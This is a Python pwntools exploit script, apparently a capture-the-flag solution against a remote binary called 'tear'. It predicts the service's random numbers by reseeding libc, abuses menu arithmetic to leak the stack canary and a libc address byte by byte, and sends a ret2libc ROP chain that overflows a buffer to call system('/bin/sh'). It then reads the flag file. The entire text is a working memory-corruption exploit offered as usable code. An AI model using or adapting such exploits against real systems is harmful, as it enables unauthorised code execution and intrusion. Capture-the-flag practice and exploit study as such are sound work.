from pwn import *
from ctypes import CDLL
import time
#io = process("./tear",aslr=True)
io = remote("10.100.0.43",10002)
libc = ELF("./libc.so.6")
cdll_libc = CDLL('libc.so.6')
cdll_libc.srand(0x7b534341)
delay = 0.25 # higher delay, more chance to mess up it seems

def brute_byte(s):
    # load properly the MSB, then call this func
    state = s
    i = 0
    flipped = False
    while True:
        i += 1
        if (i == 500):
            # rand() always gives out positive numbers, so after a while if still no hits
            # then its most prob >=0x80, so minus 0x80 to make it positive
            io.sendlineafter(b"relieved.",b"101")
            io.sendlineafter(b"luck",b"?") # make guess unchanged
            io.sendlineafter(b"choice",b"-")
            io.sendlineafter(b"minus...?",str(0x80000000).encode())
            cdll_libc.rand()

            state = state # state no change, just writing for clarity 
            flipped = True
            log.info("FLIPPED")
            continue
            
        cur_rand = cdll_libc.rand()
        target = cur_rand & 0xffffff
        state = (state&0xffff00) + ord('?')
        diff = abs(target-state)
        
        if (target > state):
            io.sendlineafter(b"relieved.",b"101")
            io.sendlineafter(b"luck",b"?") # make guess unchanged
            io.sendlineafter(b"choice",b"+")
            io.sendlineafter(b"plus...?",str(diff).encode())
    
        else:
            io.sendlineafter(b"relieved.",b"101")
            io.sendlineafter(b"luck",b"?") # make guess unchanged
            io.sendlineafter(b"choice",b"-")
            io.sendlineafter(b"minus...?",str(diff).encode())
    
        state = target
    
        resp = io.recvuntil(b"..")
        if b"wow" in resp:
            io.sendline(b"2069054273")
            log.info("BYTE FOUND")
    
            # have to do this for some reason
            io.sendlineafter(b"relieved.",b"101")
            io.sendlineafter(b"luck",b"A")
            io.sendlineafter(b"choice",b"-")
            cdll_libc.rand() 

            if not flipped:
                return cur_rand>>24
            else:
                return (cur_rand>>24)+0x80


def brute_canary():
    canary_1 = 0
    # first 3 real bytes
    for i in range(3):
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"\x0b") # chr(0x41-0xd8//4)
        io.sendlineafter(b"choice",b"*")
        io.sendlineafter(b"multiply...?",str(0x1 << 8*(2-i)).encode())
        cdll_libc.rand() 
        
        time.sleep(delay)
        new_byte = brute_byte(canary_1 << 8*(2-i))
        canary_1 += new_byte << 8*(i+1)

    log.info("CANARY LEAK STAGE 1 SUCCESSFUL")
    log.info("CANARY PART 1: " + hex(canary_1))
    
    # other 4 bytes
    canary_2 = 0
    for i in range(4):
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"\x0c") 
        io.sendlineafter(b"choice",b"*")
        io.sendlineafter(b"multiply...?",str(0x1 << 8*(3-i)).encode())
        cdll_libc.rand() 
        
        time.sleep(delay)
        new_byte = brute_byte(canary_2 << 8*(3-i))
        canary_2 += new_byte << 8*i

    log.info("CANARY LEAK STAGE 2 SUCCESSFUL:")
    log.info("CANARY PART 2: " + hex(canary_2))
    return (canary_2<<32) + canary_1

# could probably be written a lot cleaner by joining the canary func with this
def brute_libc():
    libc_addr = 0
    for i in range(4):
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"\x1b") 
        io.sendlineafter(b"choice",b"*")
        io.sendlineafter(b"multiply...?",str(0x1 << 8*(3-i)).encode())
        cdll_libc.rand() 
        
        time.sleep(delay)
        new_byte = brute_byte(libc_addr << 8*(3-i))
        libc_addr += new_byte << 8*i
    
    # brute one more byte
    io.sendlineafter(b"relieved.",b"101")
    io.sendlineafter(b"luck",b"\x1c") 
    io.sendlineafter(b"choice",b"*")
    io.sendlineafter(b"multiply...?",str(0x1 << 8*3).encode())
    cdll_libc.rand() 
    
    time.sleep(delay)
    libc_addr = (0x7f << 40) + (brute_byte(0) << 32) + libc_addr

    log.info("LIBC BRUTE SUCCESSFUL")

    return libc_addr



canary = brute_canary()
log.info("CANARY: " + hex(canary))

libc.address = brute_libc() - libc.symbols["_IO_file_overflow"] - 259
log.info("LIBC BASE: " + hex(libc.address))

pop_rdi = p64(libc.address + 0x10f75b)
ret = p64(libc.address + 0x10f75c)

ret2libc = b"A"*0x108 + p64(canary) + p64(0) + ret
ret2libc +=  pop_rdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])


#gdb.attach(io,gdbscript="break *0x0000555555555a53")
io.sendlineafter(b"relieved.",b"102")
io.sendlineafter(b"skill.",ret2libc)

time.sleep(1)
io.sendline(b"cat /home/acs_ctf/flag")
io.interactive()
